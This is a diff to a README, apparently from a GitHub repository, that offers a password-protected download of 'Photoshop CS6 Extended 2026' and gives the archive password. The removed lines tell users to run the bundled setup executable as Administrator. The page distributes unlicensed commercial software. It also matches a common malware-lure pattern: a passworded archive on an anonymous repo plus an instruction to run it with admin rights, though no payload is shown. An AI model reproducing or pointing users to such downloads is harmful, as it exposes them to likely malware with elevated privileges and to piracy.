@@ -24,19 +24,6 @@ Password-protected archive with the complete CS6 package – extract and start e
 📥 [Download `Photoshop-CS6-Extended-2026.zip`](https://github.com/YOURUSERNAME/Photoshop-CS6-Desktop/releases/download/v2026/Photoshop-CS6-Extended-2026.zip)  
 🔐 `LS2026`
 ---
-### Archive Contents
-- `Photoshop_CS6_Setup.exe` – full installer
-- `Portable/` – portable version (no installation required)
-- `setup_guide.txt` – quick start instructions
-- `extras/` – bonus brushes, actions, gradients and presets
-
----
-## 🚀 Quick Start
-1. Extract the archive  
-2. Run `Photoshop_CS6_Setup.exe` as Administrator  
-3. Follow simple installation  
-4. Launch Photoshop CS6  
-5. Start creating: photo retouching, digital painting, graphic design and more
 
 > ℹ️ Best for graphic designers, photographers, digital artists and everyone who loves the classic Photoshop interface and stability on Windows 10/11.
 
